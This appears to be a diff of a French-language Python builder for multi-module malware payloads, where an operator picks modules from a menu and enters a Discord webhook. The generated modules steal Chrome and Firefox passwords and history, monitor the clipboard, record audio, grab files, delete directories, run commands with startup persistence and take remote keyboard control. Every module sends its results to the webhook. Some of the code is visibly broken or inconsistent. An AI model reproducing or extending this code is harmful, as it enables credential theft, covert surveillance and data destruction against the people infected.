@@ -3,7 +3,9 @@ import time
 from colorama import Fore, Style
 import os
 
-code = ""
+
+
+code = """"""
 
 modules_disponibles = [
         "Clipboard Monitor",
@@ -53,7 +55,7 @@ def clipboard_module():
           
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
-    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
+    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
     2. Type de données à capturer (texte, images, etc.)
     
     
@@ -132,7 +134,9 @@ def clipboard_monitor():
         if old != mtn:
             old = mtn
 
-clipboard_monitor()
+        requests.post(WEBHOOK_URL, json={{"content": f"Contenu du presse-papier à {{current_time}} : {{mtn}}"}})
+        
+
 """
     while True:
         affichage_clipboard()
@@ -157,13 +161,14 @@ clipboard_monitor()
 #def screenshot_module():
 
 def rmdir_module():
+    global code, WEBHOOK
     def affichage_rmdir():
         clear()
         print(Fore.CYAN + "=== Configuration Remove Directory ===\n" + Style.RESET_ALL)
         print(f"""
           {Fore.YELLOW}Options :
 {Fore.WHITE}
-    1. Chemin du répertoire à supprimer
+    1. Chemin du répertoire à supprimer {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
     2. Suppression récursive
     3. Délai avant suppression (en secondes)
 
@@ -173,82 +178,81 @@ Tapez : valider pour valider
 {Style.RESET_ALL}
         """)
 
-    def rmdir():
+    clear()
+
+    choix = {
+        "Chemin du répertoire": None,
+        "Suppression récursive": False,
+        "Délai avant suppression": 0,
+    }
+
+    # -----------------------------------------------
+    # Fonctions de configuration
+    # -----------------------------------------------
+
+    def chemin_option():
         clear()
-
-        choix = {
-            "Chemin du répertoire": None,
-            "Suppression récursive": False,
-            "Délai avant suppression": 0,
-        }
-
-        # -----------------------------------------------
-        # Fonctions de configuration
-        # -----------------------------------------------
-
-        def chemin_option():
-            clear()
-            chemin = input("Entrez le chemin du répertoire à supprimer : ").strip()
-            if chemin == "":
-                print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
-                time.sleep(1)
-            else:
-                choix["Chemin du répertoire"] = chemin
-                print(f"Chemin défini sur : {chemin}")
-                time.sleep(1)
-            affichage_rmdir()
-
-        def recursive_option():
-            clear()
-            reponse = input("Suppression récursive ? (y/n) : ").strip().lower()
-            if reponse == "y":
-                choix["Suppression récursive"] = True
-                print("Suppression récursive activée.")
-            elif reponse == "n":
-                choix["Suppression récursive"] = False
-                print("Suppression récursive désactivée.")
-            else:
-                print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
+        chemin = input("Entrez le chemin du répertoire à supprimer : ").strip()
+        if chemin == "":
+            print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
             time.sleep(1)
-            affichage_rmdir()
+        else:
+            choix["Chemin du répertoire"] = chemin
+            print(f"Chemin défini sur : {chemin}")
+            time.sleep(1)
+        affichage_rmdir()
 
-        def delai_option():
-            clear()
-            delai = input("Délai avant suppression (en secondes, 0 = immédiat) : ").strip()
-            try:
-                delai = int(delai)
-                if delai < 0:
-                    raise ValueError
-                choix["Délai avant suppression"] = delai
-                print(f"Délai défini sur {delai} seconde(s).")
-                time.sleep(1)
-            except ValueError:
-                print(Fore.RED + "Veuillez entrer un nombre entier positif." + Style.RESET_ALL)
-                time.sleep(1)
-            affichage_rmdir()
+    def recursive_option():
+        clear()
+        reponse = input("Suppression récursive ? (y/n) : ").strip().lower()
+        if reponse == "y":
+            choix["Suppression récursive"] = True
+            print("Suppression récursive activée.")
+        elif reponse == "n":
+            choix["Suppression récursive"] = False
+            print("Suppression récursive désactivée.")
+        else:
+            print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
+        time.sleep(1)
+        affichage_rmdir()
 
-        # -----------------------------------------------
-        # Liste des options
-        # -----------------------------------------------
-        options = [
-            ("Chemin du répertoire",     chemin_option),    # 1
-            ("Suppression récursive",    recursive_option), # 2
-            ("Délai avant suppression",  delai_option),     # 3
-        ]
+    def delai_option():
+        clear()
+        delai = input("Délai avant suppression (en secondes, 0 = immédiat) : ").strip()
+        try:
+            delai = int(delai)
+            if delai < 0:
+                raise ValueError
+            choix["Délai avant suppression"] = delai
+            print(f"Délai défini sur {delai} seconde(s).")
+            time.sleep(1)
+        except ValueError:
+            print(Fore.RED + "Veuillez entrer un nombre entier positif." + Style.RESET_ALL)
+            time.sleep(1)
+        affichage_rmdir()
 
-        def create_payload():
-            global code
-            chemin = choix["Chemin du répertoire"]
-            recursive = choix["Suppression récursive"]
-            delai = choix["Délai avant suppression"]
+    # -----------------------------------------------
+    # Liste des options
+    # -----------------------------------------------
+    options = [
+        ("Chemin du répertoire",     chemin_option),    # 1
+        ("Suppression récursive",    recursive_option), # 2
+        ("Délai avant suppression",  delai_option),     # 3
+    ]
 
-            if not chemin:
-                print(Fore.RED + "Le chemin du répertoire est requis." + Style.RESET_ALL)
-                return
+    def create_payload():
+        global code
+        chemin = choix["Chemin du répertoire"]
+        recursive = choix["Suppression récursive"]
+        delai = choix["Délai avant suppression"]
 
-            code += f"""
+        if not chemin:
+            print(Fore.RED + "Le chemin du répertoire est requis." + Style.RESET_ALL)
+            return
 
-            import os
+        code += f"""
+
+import os
 import time
 import shutil
 
@@ -283,7 +287,7 @@ def remove_directory():
             # fonctionne uniquement si le dossier est VIDE
             os.rmdir(CHEMIN)
 
-        requests.post(WEBHOOK_URL, json={"content": f"Répertoire supprimé : {chemin}"})
+        requests.post(WEBHOOK_URL, json={"content": f"Répertoire supprimé "})
 
     except OSError as e:
         print(f'Erreur lors de la suppression : ')
@@ -293,11 +297,29 @@ def remove_directory():
             print("Astuce : activez la suppression récursive si le dossier n'est pas vide.")
             """
 
+    while True:
+        affichage_rmdir()
+        cmd = input(">> : ").lower()
+
+        if cmd == "exit":
+            break
+        elif cmd == "valider":
+            create_payload()
+            break
+        elif cmd.lower().startswith("set "):
+            try:
+                option_choix = int(cmd.split()[1]) - 1
+                if 0 <= option_choix < len(options):
+                    options[option_choix][1]()
+                else:
+                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
+            except ValueError:
+                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)
+
 def rmscript():
-    global code
+    global code, WEBHOOK
 
     choix = {
-        "Nom du script à supprimer": None,
         "Délai avant suppression": 0,
         "Recherche récursive": False,
     }
@@ -308,7 +330,7 @@ def rmscript():
         print(f"""
 {Fore.YELLOW}Options :
 {Fore.WHITE}
-1. Nom du script (ex: tool.exe)
+1. Nom du script (ex: tool.exe) {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
 2. Délai avant suppression
 3. Recherche récursive (y/n)
 
@@ -393,6 +415,7 @@ def remove_script():
                     found = True
                 except:
                     pass
+        requests.post(WEBHOOK_URL, json={{"content": f"Script supprimé : {{NOM_SCRIPT}} (recherche récursive)"}})
     else:
         path = os.path.join(base, NOM_SCRIPT)
         if os.path.isfile(path):
@@ -427,7 +450,7 @@ def remove_script():
                 time.sleep(1)
 
 def runcmd_module():
-    global code
+    global code, WEBHOOK
 
     choix = {
         "Commande à exécuter": None,
@@ -442,7 +465,7 @@ def runcmd_module():
         print(f"""
 {Fore.YELLOW}Options :
 {Fore.WHITE}
-1. Commande à exécuter
+1. Commande à exécuter {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
 2. Lancer au démarrage (Windows)
 3. Exécuter en boucle
 4. Délai entre les exécutions
@@ -570,7 +593,7 @@ run_command()
                 time.sleep(1)
 
 def shutdown_module():
-    global code
+    global code, WEBHOOK
 
     choix = {
         "Délai avant extinction": 0,
@@ -700,10 +723,10 @@ shutdown_payload()
                 time.sleep(1)
 
 def steal_module():
-    global code
+    global code, WEBHOOK
 
     choix = {
-        "Cible navigateur": "1",  # 1=Chrome, 2=Firefox, 3=Tous
+        "Cible navigateur": "1",
     }
 
     def affichage_browser():
@@ -731,12 +754,12 @@ exit
             time.sleep(1)
 
     options = {
-        "1": set_cible
+        "1": set_cible,
     }
 
     def create_payload():
-        global code
-
+        global code, WEBHOOK
+        
         code += f"""
 
 import os
@@ -753,12 +776,17 @@ import shutil
 import time
 from datetime import datetime
 
+WEBHOOK_URL = {repr(WEBHOOK)}
+
 
 
 def send_to_discord(content, filename=None):
     try:
-        if filename:
+        if filename:"""
+        code += """
             files = {'file': (filename, io.BytesIO(content.encode('utf-8')))}
+            """
+        code += """
             requests.post(WEBHOOK_URL, files=files)
         else:
             if len(content) > 1900:
@@ -877,7 +905,7 @@ def main():
     
 """
     if choix["Cible navigateur"] == "1":
-        payload +="""
+        code +="""
         print("Chrome...")
         psw, hist = get_chrome_data()
 
@@ -901,7 +929,7 @@ def main():
 
 """
     if choix["Cible navigateur"] == "2":
-        payload +="""
+        code +="""
     # Firefox passwords
         psw, hist = get_firefox_data()
         txt = "--- FIREFOX PASSWORDS ---\n\n"
@@ -926,7 +954,7 @@ if __name__ == "__main__":
 
     """
     if choix["Cible navigateur"] == "3":
-        payload +="""
+        code +="""
         print("Chrome...")
         psw, hist = get_chrome_data()
         psw, hist = get_firefox_data()
@@ -985,12 +1013,11 @@ if __name__ == "__main__":
                 options[num]()
 
 def voicerecorder_module():
+    global code, WEBHOOK
     clear()
 
     choix = {
         "Durée de l'enregistrement": 10,
-        "Envoi par Discord": None,
-        "Envoi par serveur HTTP": None,
     }
 
     def affichage():
@@ -1000,11 +1027,6 @@ def voicerecorder_module():
 {Fore.YELLOW}Options : 
 {Fore.WHITE}
 1. Durée de l'enregistrement (en secondes)
-
-{Fore.YELLOW}Sortie et envoi:
-
-2. Envoi par Discord
-3. Envoi par serveur HTTP
 
 {Fore.GREEN}
 set <num>   pour configurer
@@ -1026,20 +1048,8 @@ exit        pour revenir
             input("Appuyez sur Entrée...")
         affichage()
 
-    def set_discord():
-        val = input("Entrez le webhook Discord (laisser vide pour ne pas envoyer) : ").strip()
-        choix["Envoi par Discord"] = val if val else None
-        affichage()
-
-    def set_http():
-        val = input("Entrez l'URL du serveur HTTP (laisser vide pour ne pas envoyer) : ").strip()
-        choix["Envoi par serveur HTTP"] = val if val else None
-        affichage()
-
     options = {
         "1": set_duree,
-        "2": set_discord,
-        "3": set_http
     }
 
     # -------------------------
@@ -1049,10 +1059,8 @@ exit        pour revenir
         clear()
         print("=== Payload Voice Recorder Généré ===\n")
         duree = choix["Durée de l'enregistrement"]
-        discord_webhook = choix["Envoi par Discord"]
-        http_server = choix["Envoi par serveur HTTP"]
 
-        payload = f"""
+        code += f"""
 import os
 os.system("pip install sounddevice wavio requests")
 
@@ -1071,41 +1079,22 @@ def record_voice():
     print(f"Enregistrement terminé. Fichier sauvegardé sous {{filename}}")
     return filename
 
-def send_to_discord(webhook_url, file_path):
+def send_to_discord(file_path):
     import requests
     with open(file_path, 'rb') as f:
         files = {{'file': f}}
-        response = requests.post(webhook_url, files=files)
+        response = requests.post(WEBHOOK_URL, files=files)
     if response.status_code == 204:
         print("Fichier envoyé sur Discord avec succès.")
     else:
         print("Échec de l'envoi sur Discord.")
 
-def send_to_http(server_url, file_path):
-    import requests
-    with open(file_path, 'rb') as f:
-        files = {{'file': f}}
-        response = requests.post(server_url, files=files)
-    if response.status_code == 200:
-        print("Fichier envoyé au serveur HTTP avec succès.")
-    else:
-        print("Échec de l'envoi au serveur HTTP.")
-
 if __name__ == "__main__":
     recorded_file = record_voice()
+    send_to_discord(recorded_file)
 """
-        if discord_webhook:
-            payload += f'    send_to_discord(r"{discord_webhook}", recorded_file)\n'
-        if http_server:
-            payload += f'    send_to_http(r"{http_server}", recorded_file)\n'
 
-        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "voicerec_payload.py")
-        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
-        with open(payload_path, "w", encoding="utf-8") as f:
-            f.write(payload)
 
-        print(f"Payload créé : {payload_path}")
-        input("Appuyez sur Entrée pour continuer...")
 
     # -------------------------
     # LOOP
@@ -1136,10 +1125,9 @@ if __name__ == "__main__":
             input("Appuyez sur Entrée...")
 
 def wallpaper_module():
-    global code
+    global code, WEBHOOK
 
     choix = {
-        "Wallpaper": None,
     }
 
     def affichage_wallpaper():
@@ -1149,7 +1137,7 @@ def wallpaper_module():
           
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
-    1. Mettre un Wallpaper
+    1. Mettre un Wallpaper {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
 
               {Fore.GREEN}
 Tapez : set <num> pour configurer
@@ -1177,7 +1165,7 @@ Tapez : exit pour quitter{Style.RESET_ALL}
     # PAYLOAD
     # -------------------------
     def create_payload():
-        global code
+        global code, WEBHOOK
 
         if not choix["Wallpaper"]:
             print("Wallpaper requis")
@@ -1226,10 +1214,9 @@ set_wallpaper()
 #def search_interceptor():
 #
 def directory_listing_module():
-    global code
+    global code, WEBHOOK
 
     choix = {
-        "Chemin du répertoire": None,
         "Inclure les fichiers cachés": False,
         "Délai avant listing": 0,
         "Récursif": False,
@@ -1240,20 +1227,22 @@ def directory_listing_module():
         clear()
         print(Fore.CYAN + "=== Directory Listing ===\n\n" + Style.RESET_ALL)
         print(f"""
-{Fore.YELLOW}Options :
+          
+          {Fore.YELLOW}Options : 
 {Fore.WHITE}
-1. Chemin
-2. Fichiers cachés
-3. Délai
-4. Récursif
-5. Extension
-
+    1. Chemin du répertoire à lister {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
+    2. Inclure les fichiers cachés
+    3. Délai avant listing (en secondes)
+    4. Récursif (inclure les sous-dossiers)
+    5. Filtrer par extension (ex: .txt)
+    
 {Fore.GREEN}
-set <num>
-valider
-exit
-{Style.RESET_ALL}
-""")
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : create pour générer
+Tapez : exit pour quitter
+            {Style.RESET_ALL}
+                  """)
 
     # -------------------------
     # OPTIONS
@@ -1294,7 +1283,7 @@ exit
     # PAYLOAD
     # -------------------------
     def create_payload():
-        global code
+        global code, WEBHOOK
 
         if not choix["Chemin du répertoire"]:
             print("Chemin requis")
@@ -1350,7 +1339,6 @@ def run_dirlist():
 
     print(f"\\nTotal : {{len(files)}} fichier(s)")
 
-run_dirlist()
 """
 
     # -------------------------
@@ -1373,8 +1361,8 @@ run_dirlist()
                 options[num]()
 
 def filegrab():
+    global code, WEBHOOK
     choix = {
-        "Chemin du fichier": None,
         "Délai avant envoi": None,
         "Nouveau nom fichier": None,
     }
@@ -1392,7 +1380,7 @@ def filegrab():
           
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
-    1. Chemin du fichier à récupérer
+    1. Chemin du fichier à récupérer {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
     2. Délai avant l'envoi (en secondes)
     3. Nouveau nom du fichier à l'envoi (optionnel)
     
@@ -1499,7 +1487,8 @@ def lancer_filegrab():
 """
 
 def keybcontrol():
-    code += """
+    global code, WEBHOOK
+    code += f"""
 import requests
 from bs4 import BeautifulSoup
 import pyautogui
@@ -1528,7 +1517,7 @@ while True:
 
 ##################### Test en ligne #####################
     if test.status_code != 200:
-        print(f"Erreur lors de la connexion à {site} : {test.status_code}")
+        print(f"Erreur lors de la connexion à {{site}} : {{test.status_code}}")
 
 
 
@@ -1558,6 +1547,7 @@ while True:
             touches = ligne.split()
             touches = [mapping.get(t, t) for t in touches]
             pyautogui.hotkey(*touches)
+            requests.post(WEBHOOK_URL, json={"content": "touches executé : " + " + ".join(touches)}, verify=False)
 
         elif ligne in touches_simples:
             pyautogui.press(mapping.get(ligne, ligne))
@@ -1570,10 +1560,9 @@ while True:
     time.sleep(5)
 """
 def openurl():
-    global code
+    global code, WEBHOOK
 
     choix = {
-        "URL": None,
         "Démarrage": False,
         "Fenêtre": False,
         "Onglet": False,
@@ -1588,7 +1577,7 @@ def openurl():
           
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
-    1. URL à ouvrir
+    1. URL à ouvrir {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
     2. Navigateur à utiliser (par défaut : système)
     3. Ouvrir en fenêtre 
     4. Ouvrir en onglet
@@ -1650,7 +1639,7 @@ Tapez : exit pour quitter
     # PAYLOAD
     # -------------------------
     def create_payload():
-        global code
+        global code, WEBHOOK
 
         if not choix["URL"]:
             print("URL requise")
@@ -1728,10 +1717,12 @@ run_open_url()
                 options[num]()
 
 def affichage_addpayload(modules_choisis):
-    global modules_disponibles, affichage_
-    clear()
-    print(Fore.CYAN + "=== Ajouter un module payload ===\n\n" + Style.RESET_ALL)
-    print(f"""
+    global modules_disponibles
+    
+    while True:
+        clear()
+        print(Fore.CYAN + "=== Ajouter un module payload ===\n\n" + Style.RESET_ALL)
+        print(f"""
           
           {Fore.YELLOW}Modules disponibles :
 {Fore.WHITE}
@@ -1750,61 +1741,100 @@ def affichage_addpayload(modules_choisis):
     13. Open URL
 {Fore.GREEN}
 Tapez : <num> pour configurer
-Tapez : valider pour valider
+Tapez : valider pour revenir
 {Style.RESET_ALL}""")
-    
-    choix = input(">>  ").lower()
+        
+        choix = input(">>  ").lower()
+        
+        if choix == "valider":
+            break
 
-    for num, module in enumerate(modules_disponibles, start=1):
-        if choix == f"{num}":
+        found = False
+        for num, module in enumerate(modules_disponibles, start=1):
+            if choix == f"{num}":
+                modules_choisis.append(module)  # ✅ AJOUT ICI
+                found = True
 
-            modules_choisis.append(module)  # ✅ AJOUT ICI
+                if module == "Clipboard Monitor":
+                    clipboard_module()
 
-            if module == "Clipboard Monitor":
-                clipboard_module()
-
-            elif module == "Remove Directory":
-                rmdir_module()
-            elif module == "Remove Script":
-                rmscript()
-            elif module == "Run Command":
-                runcmd_module()
-            elif module == "Shutdown":
-                shutdown_module()
-            elif module == "Stealer":
-                steal_module()
-            elif module == "Voice Record":
-                voicerecorder_module()
-            elif module == "Change Wallpaper":
-                wallpaper_module()
-            #elif module == "Search Interceptor":
-            #    search_interceptor()
-            elif module == "Directory Lister":
-                directory_listing_module()
-            elif module == "File Grabber":
-                filegrab()
-            elif module == "Keyboard Control":
-                keybcontrol()
-            elif module == "Open URL":
-                openurl()
+                elif module == "Remove Directory":
+                    rmdir_module()
+                elif module == "Remove Script":
+                    rmscript()
+                elif module == "Run Command":
+                    runcmd_module()
+                elif module == "Shutdown":
+                    shutdown_module()
+                elif module == "Stealer":
+                    steal_module()
+                elif module == "Voice Record":
+                    voicerecorder_module()
+                elif module == "Change Wallpaper":
+                    wallpaper_module()
+                #elif module == "Search Interceptor":
+                #    search_interceptor()
+                elif module == "Directory Lister":
+                    directory_listing_module()
+                elif module == "File Grabber":
+                    filegrab()
+                elif module == "Keyboard Control":
+                    keybcontrol()
+                elif module == "Open URL":
+                    openurl()
+                break
+        
+        if not found and choix != "valider":
+            print(Fore.RED + "Choix invalide" + Style.RESET_ALL)
+            time.sleep(1)
     
 
 
 
 def multipayload_module():
+    global code, WEBHOOK
+    
+    # Réinitialiser le code au démarrage
+    code = ""
+    
     clear()
     print("=== Multi Payload Configuration ===\n\n")
 
+    # Demander le webhook une seule fois au début
+    WEBHOOK = input("Entrez un webhook discord : ")
+    if not WEBHOOK:
+        print("Aucun webhook fourni, les résultats ne seront pas envoyés.")
+        time.sleep(2)
+        WEBHOOK = None
+    
     modules_choisis = []
+    
+    def affichage():
+        clear()
+        print(Fore.CYAN + "=== Configuration Multi Payload ===\n\n" + Style.RESET_ALL)
+        print(f"""
+          
+          {Fore.YELLOW}Options :
 
-
+{Fore.WHITE}
+    1. Ajouter un module payload
+    2. Retirer un module payload
+    3. Afficher les modules ajoutés
+    4. Webhook : {WEBHOOK if WEBHOOK else "Non configuré"}
+{Fore.GREEN}
+Tapez : <num> pour configurer
+Tapez : create pour générer
+Tapez : exit pour quitter
+            {Style.RESET_ALL}
+                  """)
+    
     while True:
         affichage()
         cmd = input(">>  ").lower()
 
         if cmd == "exit":
             break
-        elif cmd == "show":
+        elif cmd == "show" or cmd == "3":
             clear()
             print("Modules ajoutés :")
             for mod in modules_choisis:
@@ -1812,17 +1842,43 @@ def multipayload_module():
             input("\nAppuyez sur Entrée pour continuer...")
         elif cmd == "1":
             affichage_addpayload(modules_choisis)
-
+        elif cmd == "2":
+            if modules_choisis:
+                clear()
+                for i, mod in enumerate(modules_choisis, 1):
+                    print(f"{i}. {mod}")
+                try:
+                    idx = int(input("Numéro à retirer : ")) - 1
+                    if 0 <= idx < len(modules_choisis):
+                        removed = modules_choisis.pop(idx)
+                        print(f"Module retiré: {removed}")
+                        time.sleep(1)
+                except:
+                    pass
+            else:
+                print("Aucun module ajouté")
+                time.sleep(1)
         elif cmd == "create":
-            if code == "":
+            if not modules_choisis:
                 print(Fore.RED + "Aucun module ajouté !" + Style.RESET_ALL)
                 time.sleep(2)
                 continue
 
-            os.makedirs("payload", exist_ok=True)
+            # Préparer le payload avec les imports
+            payload_final = "import requests\n"
+            if WEBHOOK:
+                payload_final += "WEBHOOK_URL = " + repr(WEBHOOK) + "\n\n"
+            else:
+                payload_final += "WEBHOOK_URL = None\n\n"
+            
+            # Ajouter le code accumulé
+            payload_final += code
+            
+            os.makedirs("payload/payload_created", exist_ok=True)
 
-            with open("payload/final_payload.py", "w", encoding="utf-8") as f:
-                f.write(code)
+            with open("payload/payload_created/final_payload.py", "w", encoding="utf-8") as f:
+                f.write(payload_final)
 
-            print(Fore.GREEN + "Payload généré dans payload/final_payload.py" + Style.RESET_ALL)
+            print(Fore.GREEN + "Payload généré dans payload/payload_created/final_payload.py" + Style.RESET_ALL)
             break
+
